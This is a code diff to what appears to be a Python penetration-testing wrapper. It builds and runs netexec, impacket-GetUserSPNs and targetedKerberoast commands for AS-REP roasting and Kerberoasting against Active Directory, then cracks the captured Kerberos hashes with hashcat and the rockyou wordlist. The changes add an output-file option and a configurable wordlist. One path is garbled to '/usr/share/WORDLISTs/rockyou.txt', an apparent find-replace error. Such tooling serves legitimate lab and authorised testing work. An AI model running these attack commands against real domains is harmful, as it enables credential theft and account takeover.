@@ -1,5 +1,5 @@
 import os 
-import config
+import config, settings
 import re
 from mods import dacl
 
@@ -13,26 +13,36 @@ Action:\t[Attack] aroast
 Tool:\tnetexec, hashcat
 Option:\t-u, --username
 \t-p --password; -H, --hash; -k
+\t-o, --outputfile (Optional)
 Desc:\tPerforms AS-REP Roasting to extract crackable Kerberos AS-REP hashes from accounts without pre-authentication.
 Info:\t/
         """)
         return 0
     os.chdir(path.ws_atk)
     print('\033[92m[*]\033[0m ASREProast')
-    if isinstance(box.krb, str):
-        cmd1 = f"{box.krb_ccache} netexec ldap {box.fqdn} --use-kcache --asreproast ASREProastables.txt"
+    outputfile = "ASREProastables.txt"
+    if config.OUTPUT_FILE:
+        outputfile = config.OUTPUT_FILE
+    if box.file:
+        # kerberos -k ? 
+        cmd1 = f"netexec ldap {box.fqdn} -u {box.file} -p '' --asreproast {outputfile}"
+    elif isinstance(box.krb, str):
+        cmd1 = f"{box.krb_ccache} netexec ldap {box.fqdn} --use-kcache --asreproast {outputfile}"
     elif box.krb:
-        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} -k --asreproast ASREProastables.txt"
+        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} -k --asreproast {outputfile}"
     elif box.nt_hash:
-        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} --asreproast ASREProastables.txt"
+        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} --asreproast {outputfile}"
     else:
-        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --asreproast ASREProastables.txt"
-    cmd2 = 'hashcat -m 18200 ASREProastables.txt /usr/share/wordlists/rockyou.txt'
+        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --asreproast {outputfile}"
+    cmd2 = f'hashcat -m 18200 {outputfile} {settings.WORDLIST}'
     config.log_cmd([cmd1,cmd2])
     print(f'\033[96m[$]\033[0m {cmd1}')
     os.system(cmd1)
-    print(f'\n\033[96m[$]\033[0m {cmd2}')
-    os.system(cmd2)
+    if os.path.isfile(outputfile):
+        print(f'\n\033[96m[$]\033[0m {cmd2}')
+        os.system(cmd2)
+    else:
+        print(f"\033[93m[-]\033[0m Output file enum/{outputfile} is not there, skip cracking.")
     print('\033[38;5;28m[+]\033[0m ASREProast\n')
 
 def krbroast(box, path):
@@ -42,7 +52,8 @@ Action:\t[Attack] kroast
 Tool:\t[netexec, impacket], hashcat
 Option:\t-u, --username
 \t-p --password; -H, --hash; -k
-\t-t, --target (Optional)
+\t-t, --target      (Optional)
+\t-o, --outputfile  (Optional)
 Desc:\tPerforms Kerberoasting to extract crackable Kerberos TGS hash from objects that have a SPN set.
 Info:\t/
         """)
@@ -50,7 +61,8 @@ Info:\t/
     print('\033[92m[*]\033[0m Kerberoast')
     user_input = config.ask_for_action_choice("NXC,imp")
     outputfile = "kerberoastables.txt"
-    wordlist = "/usr/share/wordlists/rockyou.txt"
+    if config.OUTPUT_FILE:
+        outputfile = config.OUTPUT_FILE
     if user_input.lower() == "nxc":
         config.required_creds(box)
         os.chdir(path.ws_atk)
@@ -62,10 +74,9 @@ Info:\t/
             cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} --kerberoasting {outputfile}"
         else:
             cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --kerberoasting {outputfile}"
-        cmd2 = f'hashcat -m 13100 {outputfile} {wordlist}'
+        cmd2 = f'hashcat -m 13100 {outputfile} {settings.WORDLIST}'
         config.run_cmd([cmd1,cmd2])
     elif user_input.lower() == "imp":
-        # -usersfile
         config.required_creds(box)
         os.chdir(path.ws_atk)
         opt = ""
@@ -80,7 +91,7 @@ Info:\t/
             cmd1 = f"impacket-GetUserSPNs -dc-host {box.fqdn} {box.domain}/{box.username} -hashes :{box.nt_hash} {opt}-outputfile {outputfile}"
         else:
             cmd1 = f"impacket-GetUserSPNs -dc-host {box.fqdn} {box.domain}/{box.username}:{box.password} {opt}-outputfile {outputfile}"
-        cmd2 = f'hashcat -m 13100 {outputfile} {wordlist}'
+        cmd2 = f'hashcat -m 13100 {outputfile} {settings.WORDLIST}'
         config.run_cmd([cmd1,cmd2], {2:f'cat {outputfile}'}, {2:f'[*] Outputfile: {outputfile}'})
     else:
         print("\033[91m[!]\033[0m Incorrect input!")
@@ -115,7 +126,7 @@ Info:\tNot sure if this works with kerberos login, but this works to -a wspn,kro
         cmd1 = f"targetedKerberoast.py -d {box.domain} -u {box.username} -H {box.nt_hash} -o targeted_kerberoasting{target}.txt"+opt
     else:
         cmd1 = f"targetedKerberoast.py -d {box.domain} -u {box.username} -p {box.password} -o targeted_kerberoasting{target}.txt"+opt
-    cmd2 = f'hashcat -m 13100 targeted_kerberoasting{target}.txt /usr/share/wordlists/rockyou.txt'
+    cmd2 = f'hashcat -m 13100 targeted_kerberoasting{target}.txt /usr/share/WORDLISTs/rockyou.txt'
     config.log_cmd([cmd1,cmd2])
     config.time_sync(box.fqdn)
     if os.path.exists(f'{path.ws_atk}/targeted_kerberoasting{target}.txt'):
